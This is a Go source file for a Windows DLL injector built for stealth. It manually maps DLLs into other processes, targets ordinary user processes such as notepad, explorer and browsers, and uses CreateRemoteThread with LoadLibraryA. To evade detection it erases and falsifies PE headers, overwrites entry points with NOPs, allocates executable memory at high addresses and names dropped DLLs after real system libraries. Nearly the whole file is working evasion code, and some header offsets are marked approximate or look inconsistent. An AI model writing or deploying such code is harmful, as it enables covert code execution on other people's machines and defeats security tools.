package injector

import (
	"fmt"
	"os"
	"path/filepath"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ErasePEHeader implements advanced PE header erasure with multiple techniques
func ErasePEHeader(processHandle windows.Handle, baseAddress uintptr) error {
	Debug("Starting advanced PE header erasure")

	// Phase 1: Read and analyze current PE header
	peInfo, err := analyzeRemotePEHeader(processHandle, baseAddress)
	if err != nil {
		return fmt.Errorf("failed to analyze PE header: %v", err)
	}

	Debug("PE header analysis complete", "size", peInfo.HeaderSize, "entry", fmt.Sprintf("0x%X", peInfo.EntryPoint))

	// Phase 2: Selective erasure to avoid breaking functionality
	if err := performSelectivePEErasure(processHandle, baseAddress, peInfo); err != nil {
		return fmt.Errorf("selective PE erasure failed: %v", err)
	}

	// Phase 3: Pattern-based obfuscation
	if err := obfuscatePESignatures(processHandle, baseAddress, peInfo); err != nil {
		Warn("PE signature obfuscation failed", "error", err)
	}

	// Phase 4: Timestamp and checksum manipulation
	if err := manipulatePEMetadata(processHandle, baseAddress, peInfo); err != nil {
		Warn("PE metadata manipulation failed", "error", err)
	}

	Debug("Advanced PE header erasure completed")
	return nil
}

// PEHeaderInfo contains analyzed PE header information
type PEHeaderInfo struct {
	HeaderSize      uint32
	EntryPoint      uint32
	DOSHeaderOffset uint32
	PEHeaderOffset  uint32
	SectionCount    uint16
	Is64Bit         bool
	ImportTableRVA  uint32
	ExportTableRVA  uint32
}

// analyzeRemotePEHeader analyzes PE header in remote process
func analyzeRemotePEHeader(processHandle windows.Handle, baseAddress uintptr) (*PEHeaderInfo, error) {
	info := &PEHeaderInfo{}

	// Read DOS header
	var dosHeader [64]byte
	var bytesRead uintptr
	err := windows.ReadProcessMemory(processHandle, baseAddress, &dosHeader[0], 64, &bytesRead)
	if err != nil {
		return nil, fmt.Errorf("failed to read DOS header: %v", err)
	}

	// Validate DOS signature
	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
		return nil, fmt.Errorf("invalid DOS signature")
	}

	// Get PE header offset
	info.PEHeaderOffset = *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))
	if info.PEHeaderOffset >= 1024 || info.PEHeaderOffset < 64 {
		return nil, fmt.Errorf("invalid PE header offset: %d", info.PEHeaderOffset)
	}

	// Read PE header
	peHeaderAddr := baseAddress + uintptr(info.PEHeaderOffset)
	var peHeader [256]byte
	err = windows.ReadProcessMemory(processHandle, peHeaderAddr, &peHeader[0], 256, &bytesRead)
	if err != nil {
		return nil, fmt.Errorf("failed to read PE header: %v", err)
	}

	// Validate PE signature
	if peHeader[0] != 'P' || peHeader[1] != 'E' {
		return nil, fmt.Errorf("invalid PE signature")
	}

	// Extract COFF header info
	info.SectionCount = *(*uint16)(unsafe.Pointer(&peHeader[6]))
	optHeaderSize := *(*uint16)(unsafe.Pointer(&peHeader[20]))

	// Read optional header
	optHeaderAddr := peHeaderAddr + 24
	var optHeader [240]byte
	err = windows.ReadProcessMemory(processHandle, optHeaderAddr, &optHeader[0], uintptr(optHeaderSize), &bytesRead)
	if err != nil {
		return nil, fmt.Errorf("failed to read optional header: %v", err)
	}

	// Determine architecture
	magic := *(*uint16)(unsafe.Pointer(&optHeader[0]))
	info.Is64Bit = (magic == 0x20b)

	// Extract key information
	if info.Is64Bit {
		info.EntryPoint = *(*uint32)(unsafe.Pointer(&optHeader[16]))
		info.HeaderSize = *(*uint32)(unsafe.Pointer(&optHeader[60]))
		// Extract data directory info if needed
		if optHeaderSize >= 96 {
			info.ImportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[120]))
			info.ExportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[112]))
		}
	} else {
		info.EntryPoint = *(*uint32)(unsafe.Pointer(&optHeader[16]))
		info.HeaderSize = *(*uint32)(unsafe.Pointer(&optHeader[60]))
		// Extract data directory info if needed
		if optHeaderSize >= 96 {
			info.ImportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[104]))
			info.ExportTableRVA = *(*uint32)(unsafe.Pointer(&optHeader[96]))
		}
	}

	return info, nil
}

// performSelectivePEErasure performs selective erasure to preserve functionality
func performSelectivePEErasure(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
	Debug("Performing selective PE erasure")

	// Strategy 1: Erase DOS stub (safe to erase)
	if err := eraseDOSStub(processHandle, baseAddress); err != nil {
		Warn("DOS stub erasure failed", "error", err)
	}

	// Strategy 2: Selectively modify PE signature
	if err := modifyPESignature(processHandle, baseAddress, info); err != nil {
		Warn("PE signature modification failed", "error", err)
	}

	// Strategy 3: Erase unused header space
	if err := eraseUnusedHeaderSpace(processHandle, baseAddress, info); err != nil {
		Warn("Unused header space erasure failed", "error", err)
	}

	// Strategy 4: Erase section table selectively (very careful)
	if err := eraseSectionTableSelectively(processHandle, baseAddress, info); err != nil {
		Warn("Section table erasure failed", "error", err)
	}

	return nil
}

// eraseDOSStub erases the DOS stub which is safe to remove
func eraseDOSStub(processHandle windows.Handle, baseAddress uintptr) error {
	// DOS stub is typically between offset 64 and PE header offset
	// This is safe to erase as it's only used when running in DOS mode

	dosStubStart := baseAddress + 64
	dosStubSize := uintptr(60) // Conservative size

	// Fill with random data instead of zeros to avoid obvious patterns
	randomBuffer := make([]byte, dosStubSize)
	for i := range randomBuffer {
		randomBuffer[i] = byte((i*7 + 13) % 256) // Simple pattern
	}

	var bytesWritten uintptr
	err := WriteProcessMemory(processHandle, dosStubStart, unsafe.Pointer(&randomBuffer[0]), dosStubSize, &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to erase DOS stub: %v", err)
	}

	Debug("DOS stub erased", "bytes", bytesWritten)
	return nil
}

// modifyPESignature modifies PE signature to evade signature-based detection
func modifyPESignature(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
	// Modify PE signature slightly - change "PE\0\0" to "PE\x01\x02"
	// This breaks some analysis tools while preserving basic functionality

	peSignatureAddr := baseAddress + uintptr(info.PEHeaderOffset)
	modifiedSignature := []byte{'P', 'E', 0x01, 0x02}

	var bytesWritten uintptr
	err := WriteProcessMemory(processHandle, peSignatureAddr, unsafe.Pointer(&modifiedSignature[0]), 4, &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to modify PE signature: %v", err)
	}

	Debug("PE signature modified")
	return nil
}

// eraseUnusedHeaderSpace erases space between headers that's typically unused
func eraseUnusedHeaderSpace(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
	// Calculate unused space after section headers
	sectionTableOffset := info.PEHeaderOffset + 24 + uint32(unsafe.Sizeof(uint16(0))) // PE + COFF + OptHeader size field

	// Skip to after last section header
	lastSectionOffset := sectionTableOffset + uint32(info.SectionCount)*40

	// Erase space between last section header and first section data
	unusedStart := baseAddress + uintptr(lastSectionOffset)
	unusedEnd := baseAddress + uintptr(info.HeaderSize)

	if unusedEnd > unusedStart {
		unusedSize := unusedEnd - unusedStart
		if unusedSize > 0 && unusedSize < 4096 { // Sanity check
			zeroBuffer := make([]byte, unusedSize)
			var bytesWritten uintptr
			err := WriteProcessMemory(processHandle, unusedStart, unsafe.Pointer(&zeroBuffer[0]), unusedSize, &bytesWritten)
			if err != nil {
				return fmt.Errorf("failed to erase unused header space: %v", err)
			}
			Debug("Unused header space erased", "bytes", bytesWritten)
		}
	}

	return nil
}

// eraseSectionTableSelectively carefully erases parts of section table
func eraseSectionTableSelectively(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
	// Only erase section names, not the critical data
	sectionTableStart := info.PEHeaderOffset + 24 + 240 // Approximate location

	for i := uint16(0); i < info.SectionCount; i++ {
		sectionHeaderAddr := baseAddress + uintptr(sectionTableStart+uint32(i)*40)

		// Erase only the section name (first 8 bytes), not the critical offsets/sizes
		sectionNameObfuscated := []byte{0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00} // ".text" replacement

		var bytesWritten uintptr
		err := WriteProcessMemory(processHandle, sectionHeaderAddr, unsafe.Pointer(&sectionNameObfuscated[0]), 8, &bytesWritten)
		if err != nil {
			Warn("Failed to erase section name", "section", i, "error", err)
		}
	}

	return nil
}

// obfuscatePESignatures obfuscates common PE analysis signatures
func obfuscatePESignatures(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
	Debug("Obfuscating PE signatures")

	// Obfuscate rich header if present
	if err := obfuscateRichHeader(processHandle, baseAddress); err != nil {
		Warn("Rich header obfuscation failed", "error", err)
	}

	// Obfuscate debug directory
	if err := obfuscateDebugDirectory(processHandle, baseAddress, info); err != nil {
		Warn("Debug directory obfuscation failed", "error", err)
	}

	return nil
}

// obfuscateRichHeader obfuscates the Rich header if present
func obfuscateRichHeader(processHandle windows.Handle, baseAddress uintptr) error {
	// Rich header is typically between DOS header and PE header
	// Look for "Rich" signature and obfuscate it

	searchStart := baseAddress + 64
	searchEnd := baseAddress + 512 // Reasonable search range

	for addr := searchStart; addr < searchEnd-4; addr += 4 {
		var signature uint32
		var bytesRead uintptr
		err := windows.ReadProcessMemory(processHandle, addr, (*byte)(unsafe.Pointer(&signature)), 4, &bytesRead)
		if err != nil {
			continue
		}

		// Look for "Rich" signature (0x68636952)
		if signature == 0x68636952 {
			// Overwrite with random data
			obfuscated := uint32(0x12345678)
			var bytesWritten uintptr
			err = WriteProcessMemory(processHandle, addr, unsafe.Pointer(&obfuscated), 4, &bytesWritten)
			if err != nil {
				return err
			}
			Debug("Rich header signature obfuscated", "offset", fmt.Sprintf("0x%X", addr-baseAddress))
			break
		}
	}

	return nil
}

// obfuscateDebugDirectory obfuscates debug directory information
func obfuscateDebugDirectory(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
	// This would require parsing data directories and obfuscating debug info
	// For now, just log the attempt
	Debug("Debug directory obfuscation attempted")
	return nil
}

// manipulatePEMetadata manipulates timestamps and checksums
func manipulatePEMetadata(processHandle windows.Handle, baseAddress uintptr, info *PEHeaderInfo) error {
	Debug("Manipulating PE metadata")

	// Modify timestamp in COFF header
	timestampAddr := baseAddress + uintptr(info.PEHeaderOffset) + 8
	newTimestamp := uint32(946684800) // Year 2000 timestamp

	var bytesWritten uintptr
	err := WriteProcessMemory(processHandle, timestampAddr, unsafe.Pointer(&newTimestamp), 4, &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to modify timestamp: %v", err)
	}

	// Zero out checksum in optional header
	checksumAddr := baseAddress + uintptr(info.PEHeaderOffset) + 24 + 64 // Approximate location
	zeroChecksum := uint32(0)

	err = WriteProcessMemory(processHandle, checksumAddr, unsafe.Pointer(&zeroChecksum), 4, &bytesWritten)
	if err != nil {
		Warn("Failed to zero checksum", "error", err)
	}

	Debug("PE metadata manipulation completed")
	return nil
}

// EraseEntryPoint erases entry point to avoid detection
func EraseEntryPoint(processHandle windows.Handle, baseAddress uintptr) error {
	// 读取PE头，找到入口点，然后用NOP指令覆盖入口点
	// 读取DOS头和NT头，获取入口点RVA
	var dosHeader [64]byte
	var bytesRead uintptr

	// 读取DOS头
	err := windows.ReadProcessMemory(processHandle, baseAddress, &dosHeader[0], 64, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read DOS header: %v", err)
	}

	// 获取PE头偏移
	peOffset := *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))

	// 读取标准PE头
	var peHeader [24]byte
	err = windows.ReadProcessMemory(processHandle, baseAddress+uintptr(peOffset), &peHeader[0], 24, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read PE header: %v", err)
	}

	// 读取可选PE头
	var optHeader [240]byte
	err = windows.ReadProcessMemory(processHandle, baseAddress+uintptr(peOffset)+24, &optHeader[0], 240, &bytesRead)
	if err != nil {
		return fmt.Errorf("Failed to read optional PE header: %v", err)
	}

	// 获取入口点RVA (位于可选PE头的第16字节)
	entryPointRVA := *(*uint32)(unsafe.Pointer(&optHeader[16]))

	// 如果没有入口点，直接返回
	if entryPointRVA == 0 {
		return nil
	}

	// 计算入口点地址
	entryPointAddr := baseAddress + uintptr(entryPointRVA)

	// 创建NOP指令填充
	nopBuffer := make([]byte, 32) // 32字节的NOP指令
	for i := range nopBuffer {
		nopBuffer[i] = 0x90 // x86 NOP指令
	}

	// 写入NOP指令到入口点
	var bytesWritten uintptr
	err = WriteProcessMemory(processHandle, entryPointAddr, unsafe.Pointer(&nopBuffer[0]), uintptr(len(nopBuffer)), &bytesWritten)
	if err != nil {
		return fmt.Errorf("Failed to erase entry point: %v", err)
	}

	return nil
}

// InvisibleMemoryAllocation allocates memory in high address space to avoid detection
func InvisibleMemoryAllocation(hProcess windows.Handle, size uintptr) (uintptr, error) {
	Debug("Attempting to allocate invisible memory in high address space", "size", size)

	// 获取适合当前架构的高地址
	var highAddresses []uintptr
	if unsafe.Sizeof(uintptr(0)) == 8 {
		// 64位系统 - 使用运行时计算避免编译时常量溢出
		shift := uint(28)
		base1 := uint64(0x7FFF)
		base2 := uint64(0x7FFE)
		base3 := uint64(0x7FFD)

		highAddresses = []uintptr{
			uintptr(base1 << shift), // 0x7FFF0000000
			uintptr(base2 << shift), // 0x7FFE0000000
			uintptr(base3 << shift), // 0x7FFD0000000
			0x70000000,
		}
	} else {
		// 32位系统
		highAddresses = []uintptr{0x70000000, 0x60000000, 0x50000000, 0x40000000}
	}

	for _, addr := range highAddresses {
		Debug("Trying to allocate memory", "address", fmt.Sprintf("0x%X", addr))
		baseAddress, err := VirtualAllocEx(hProcess, addr, size,
			windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
		if err == nil {
			Debug("Successfully allocated invisible memory", "address", fmt.Sprintf("0x%X", baseAddress))
			return baseAddress, nil
		}
		Debug("Failed to allocate memory", "address", fmt.Sprintf("0x%X", addr), "error", err)
	}

	// 如果所有高地址都失败，尝试让系统自动选择
	Debug("Failed to allocate memory in high address space, letting system choose address")
	baseAddress, err := VirtualAllocEx(hProcess, 0, size,
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return 0, fmt.Errorf("Failed to allocate invisible memory: %v", err)
	}
	Debug("System selected address for invisible memory", "address", fmt.Sprintf("0x%X", baseAddress))
	return baseAddress, nil
}

// ManualMapDLL loads DLL using manual mapping method
func ManualMapDLL(hProcess windows.Handle, dllBytes []byte) (uintptr, error) {
	// 检查参数
	if hProcess == 0 {
		return 0, fmt.Errorf("Process handle cannot be zero")
	}

	if len(dllBytes) == 0 {
		return 0, fmt.Errorf("DLL data cannot be empty")
	}

	Debug("Starting manual mapping of DLL", "DLL size", len(dllBytes))

	// 解析PE头
	peHeader, err := ParsePEHeader(dllBytes)
	if err != nil {
		return 0, fmt.Errorf("Failed to parse PE header: %v", err)
	}

	Debug("Successfully parsed PE header", "image size", peHeader.GetSizeOfImage())

	// 计算需要分配的内存大小
	imageSize := peHeader.GetSizeOfImage()

	// 分配内存基址
	var baseAddress uintptr

	// 分配内存 - 简化版本
	Debug("Allocating memory for DLL")
	baseAddress, err = VirtualAllocEx(hProcess, 0, uintptr(imageSize),
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		return 0, fmt.Errorf("Failed to allocate memory in target process: %v", err)
	}
	Debug("Successfully allocated memory", "address", fmt.Sprintf("0x%X", baseAddress))

	// 映射PE文件各节到远程进程内存
	Debug("Starting to map PE sections to remote process memory")
	tempInjector := &Injector{} // Create temporary injector instance for method calls
	err = tempInjector.MapSections(hProcess, dllBytes, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to map PE sections: %v", err)
	}
	Debug("Successfully mapped PE sections")

	// 修复导入表
	Debug("Starting to fix import table")
	err = FixImports(hProcess, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to fix import table: %v", err)
	}
	Debug("Successfully fixed import table")

	// 修复重定位
	Debug("Starting to fix relocations")
	err = FixRelocations(hProcess, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to fix relocations: %v", err)
	}
	Debug("Successfully fixed relocations")

	// 执行DLL入口点
	Debug("Starting to execute DLL entry point")
	err = ExecuteDllEntry(hProcess, baseAddress, peHeader)
	if err != nil {
		return 0, fmt.Errorf("Failed to execute DLL entry point: %v", err)
	}
	Debug("Successfully executed DLL entry point")

	// 应用高级反检测技术已移除，因为需要options参数

	Debug("Manual mapping of DLL completed", "base address", fmt.Sprintf("0x%X", baseAddress))
	return baseAddress, nil
}

// FindLegitProcess 查找合法进程进行注入
func FindLegitProcess() (uint32, string, error) {
	// 常见的合法用户进程名称，避免选择系统进程
	legitimateProcesses := []string{
		"notepad.exe",
		"explorer.exe",
		"msedge.exe",
		"chrome.exe",
		"firefox.exe",
		"iexplore.exe",
		"calc.exe",
		"mspaint.exe",
	}

	// 获取系统进程列表
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, "", fmt.Errorf("Failed to create process snapshot: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var processEntry windows.ProcessEntry32
	processEntry.Size = uint32(unsafe.Sizeof(processEntry))

	// 查找合法进程
	var targetPID uint32
	var targetName string

	err = windows.Process32First(snapshot, &processEntry)
	if err != nil {
		return 0, "", fmt.Errorf("Failed to get first process: %v", err)
	}

	for {
		processName := windows.UTF16ToString(processEntry.ExeFile[:])
		for _, legitName := range legitimateProcesses {
			if processName == legitName {
				// 尝试打开进程检查是否有访问权限
				hProcess, err := windows.OpenProcess(
					windows.PROCESS_CREATE_THREAD|
						windows.PROCESS_VM_OPERATION|
						windows.PROCESS_VM_WRITE|
						windows.PROCESS_VM_READ|
						windows.PROCESS_QUERY_INFORMATION,
					false, processEntry.ProcessID)

				if err == nil {
					// 如果能成功打开进程，则选择该进程
					windows.CloseHandle(hProcess)
					targetPID = processEntry.ProcessID
					targetName = processName
					Debug("Found accessible legitimate process", "process", targetName, "PID", targetPID)
					break
				}
				// 如果无法打开进程，继续查找下一个
			}
		}

		if targetPID != 0 {
			break
		}

		err = windows.Process32Next(snapshot, &processEntry)
		if err != nil {
			break
		}
	}

	if targetPID == 0 {
		// 如果找不到现有的合法进程，尝试启动一个新的记事本进程
		Debug("Could not find accessible legitimate process, trying to start Notepad")

		// 创建记事本进程
		si := windows.StartupInfo{}
		pi := windows.ProcessInformation{}

		si.Cb = uint32(unsafe.Sizeof(si))

		// 构建命令行
		cmdLine, _ := windows.UTF16PtrFromString("notepad.exe")

		err := windows.CreateProcess(
			nil,
			cmdLine,
			nil,
			nil,
			false,
			windows.CREATE_NEW_CONSOLE,
			nil,
			nil,
			&si,
			&pi)

		if err != nil {
			return 0, "", fmt.Errorf("Failed to start Notepad process: %v", err)
		}

		// 关闭不需要的句柄
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)

		targetPID = pi.ProcessId
		targetName = "notepad.exe"
		Debug("Started new Notepad process", "PID", targetPID)
	}

	if targetPID == 0 {
		return 0, "", fmt.Errorf("Could not find or create a legitimate process for injection")
	}

	return targetPID, targetName, nil
}

// LegitimateProcessInjection performs injection through a legitimate process
func LegitimateProcessInjection(hProcess windows.Handle, dllBytes []byte) error {
	Debug("Starting legitimate process injection")

	// Find a legitimate process to use as intermediary
	legitPID, legitName, err := FindLegitProcess()
	if err != nil {
		return fmt.Errorf("failed to find legitimate process: %v", err)
	}

	Debug("Using legitimate process", "process", legitName, "PID", legitPID)

	// Open legitimate process
	legitHandle, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|
			windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|
			windows.PROCESS_QUERY_INFORMATION,
		false, legitPID)
	if err != nil {
		return fmt.Errorf("failed to open legitimate process: %v", err)
	}
	defer windows.CloseHandle(legitHandle)

	// First inject into legitimate process using standard method
	// Create temporary DLL file
	tempFile, err := createTempDllFile(dllBytes)
	if err != nil {
		return fmt.Errorf("failed to create temp DLL file: %v", err)
	}
	defer os.Remove(tempFile)

	// Allocate memory in legitimate process for DLL path
	dllPathBytes := []byte(tempFile + "\x00")
	pathSize := len(dllPathBytes)

	memAddr, err := VirtualAllocEx(legitHandle, 0, uintptr(pathSize),
		windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_READWRITE)
	if err != nil {
		return fmt.Errorf("failed to allocate memory in legitimate process: %v", err)
	}

	// Write DLL path to legitimate process
	var bytesWritten uintptr
	err = WriteProcessMemory(legitHandle, memAddr, unsafe.Pointer(&dllPathBytes[0]),
		uintptr(pathSize), &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to write DLL path to legitimate process: %v", err)
	}

	// Get LoadLibraryA address
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLibraryA := kernel32.NewProc("LoadLibraryA")
	loadLibraryAddr := loadLibraryA.Addr()

	// Create remote thread in legitimate process
	var threadID uint32
	threadHandle, err := CreateRemoteThread(legitHandle, nil, 0,
		loadLibraryAddr, memAddr, 0, &threadID)
	if err != nil {
		return fmt.Errorf("failed to create remote thread in legitimate process: %v", err)
	}
	defer windows.CloseHandle(threadHandle)

	// Wait for injection to complete
	waitResult, err := windows.WaitForSingleObject(threadHandle, 5000)
	if err != nil {
		return fmt.Errorf("failed to wait for legitimate process injection: %v", err)
	}

	if waitResult == uint32(windows.WAIT_TIMEOUT) {
		return fmt.Errorf("legitimate process injection timed out")
	}

	Debug("Successfully injected DLL into legitimate process")

	// Now the DLL should be running in the legitimate process
	// and can be used to inject into the target process through
	// less suspicious means

	return nil
}

// ErasePEHeaderSafely performs safer PE header erasure for LoadLibrary-based injections
func ErasePEHeaderSafely(processHandle windows.Handle, baseAddress uintptr) error {
	Debug("Starting safe PE header erasure for LoadLibrary-based injection")

	// Only erase non-critical parts of the PE header
	// Preserve export table, import table, and other critical structures

	// Phase 1: Erase DOS stub only (safest)
	if err := eraseDOSStub(processHandle, baseAddress); err != nil {
		return fmt.Errorf("failed to erase DOS stub: %v", err)
	}

	// Phase 2: Modify PE signature to a less obvious value (but not completely erase)
	peSignatureAddr := baseAddress + 0x3C
	var peOffset uint32
	var bytesRead uintptr

	err := windows.ReadProcessMemory(processHandle, peSignatureAddr,
		(*byte)(unsafe.Pointer(&peOffset)), 4, &bytesRead)
	if err != nil {
		return fmt.Errorf("failed to read PE offset: %v", err)
	}

	// Modify PE signature to look like a different file type
	modifiedSignature := []byte{0x4D, 0x5A, 0x90, 0x00} // Modified but still functional
	var bytesWritten uintptr
	err = WriteProcessMemory(processHandle, baseAddress+uintptr(peOffset),
		unsafe.Pointer(&modifiedSignature[0]), 4, &bytesWritten)
	if err != nil {
		Warn("Failed to modify PE signature", "error", err)
	}

	Debug("Safe PE header erasure completed")
	return nil
}

// EraseEntryPointSafely performs safer entry point erasure for LoadLibrary-based injections
func EraseEntryPointSafely(processHandle windows.Handle, baseAddress uintptr) error {
	Debug("Starting safe entry point erasure for LoadLibrary-based injection")

	// Read PE header to find entry point
	var dosHeader [64]byte
	var bytesRead uintptr

	err := windows.ReadProcessMemory(processHandle, baseAddress, &dosHeader[0], 64, &bytesRead)
	if err != nil {
		return fmt.Errorf("failed to read DOS header: %v", err)
	}

	peOffset := *(*uint32)(unsafe.Pointer(&dosHeader[0x3C]))

	// Read NT headers to get entry point
	var ntHeaders [248]byte // Size of IMAGE_NT_HEADERS64
	err = windows.ReadProcessMemory(processHandle, baseAddress+uintptr(peOffset),
		&ntHeaders[0], 248, &bytesRead)
	if err != nil {
		return fmt.Errorf("failed to read NT headers: %v", err)
	}

	// Get entry point RVA (offset 40 in optional header)
	entryPointRVA := *(*uint32)(unsafe.Pointer(&ntHeaders[24+16+40]))

	if entryPointRVA == 0 {
		Debug("No entry point found, skipping erasure")
		return nil
	}

	entryPointAddr := baseAddress + uintptr(entryPointRVA)

	// Instead of completely erasing, just modify the first few bytes
	// This preserves most functionality while still providing some obfuscation
	modifiedBytes := []byte{0x90, 0x90, 0x90, 0x90} // NOP sled (safer than complete erasure)

	var bytesWritten uintptr
	err = WriteProcessMemory(processHandle, entryPointAddr,
		unsafe.Pointer(&modifiedBytes[0]), 4, &bytesWritten)
	if err != nil {
		return fmt.Errorf("failed to modify entry point: %v", err)
	}

	Debug("Safe entry point modification completed")
	return nil
}

// Helper function to create temp DLL file using real DLL names
func createTempDllFile(dllBytes []byte) (string, error) {
	tempDir := os.TempDir()

	// Use real system DLL names for better stealth
	realDllNames := []string{
		"msvcr120.dll",
		"msvcp120.dll",
		"vcruntime140.dll",
		"msvcp140.dll",
		"ucrtbase.dll",
		"concrt140.dll",
		"vccorlib140.dll",
		"api-ms-win-core-heap-l1-1-0.dll",
		"api-ms-win-core-synch-l1-2-0.dll",
		"api-ms-win-core-memory-l1-1-1.dll",
	}

	// Select a real DLL name based on current time
	fileName := realDllNames[time.Now().UnixNano()%int64(len(realDllNames))]
	tempFile := filepath.Join(tempDir, fileName)

	err := os.WriteFile(tempFile, dllBytes, 0644)
	if err != nil {
		return "", fmt.Errorf("failed to create temporary DLL file: %v", err)
	}

	return tempFile, nil
}
